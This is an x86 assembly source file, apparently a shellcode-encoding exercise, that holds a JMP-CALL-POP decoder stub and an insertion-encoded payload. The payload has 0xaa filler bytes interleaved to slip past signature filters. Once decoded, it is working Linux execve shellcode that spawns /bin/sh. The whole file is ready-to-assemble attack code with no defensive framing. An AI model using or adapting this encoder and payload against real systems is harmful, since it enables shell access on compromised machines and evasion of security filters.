global _start

section .text

_start:

	jmp short call_shellcode

decoder:

	pop esi
	lea edi, [esi +1]			; Track 0xaa over encoded shellcode
	xor eax, eax				; counter
	mov al, 1				
	xor ebx, ebx				; counter

decode:

	mov bl, byte [esi + eax]		; pointing the second byte
	xor bl, 0xaa				; setting zero flag - xor 0xaa, 0xaa
	jnz short encoded_shellcode		; non zero flag will set, when all the shellcode is decoded
	mov bl, byte [esi + eax + 1]		; storing the shellcode byte next to 0xaa on the address of 0xaa
	mov byte[edi], bl			; store the bl value to EDI 
	inc edi					; increment edi, so that edi will point to next 0xaa
	add al, 2				; 0xaa is present on even 
	jmp short decode

call_shellcode:
	
	call decoder
	; 0xbb,0xbb is added for terminating decoding process
	encoded_shellcode: db 0x31,0xaa,0xc0,0xaa,0x50,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x68,0xaa,0x69,0xaa,0x6e,0xaa,0x2f,0xaa,0x2f,0xaa,0x68,0xaa,0x2f,0xaa,0x2f,0xaa,0x2f,0xaa,0x62,0xaa,0x89,0xaa,0xe3,0xaa,0x50,0xaa,0x89,0xaa,0xe2,0xaa,0x53,0xaa,0x89,0xaa,0xe1,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa,0xbb,0xbb
